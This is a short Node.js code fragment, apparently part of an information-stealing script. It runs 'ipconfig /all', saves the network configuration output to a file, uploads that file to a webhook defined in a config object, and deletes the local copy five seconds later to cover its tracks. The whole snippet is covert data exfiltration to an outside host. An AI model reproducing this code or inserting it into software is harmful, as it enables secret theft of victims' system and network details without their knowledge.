exec("ipconfig /all", (error, stdout, stderr) => {
	fs.writeFile('ipconfig.txt', stdout, async function (err) {
	const hook = new Webhook(config.webhook);

await hook.sendFile('./ipconfig.txt');
})
setTimeout(function () {
	fs.unlink('ipconfig.txt', function (err) {
		if (err) throw err;
	}
		);
}, 5000);
})
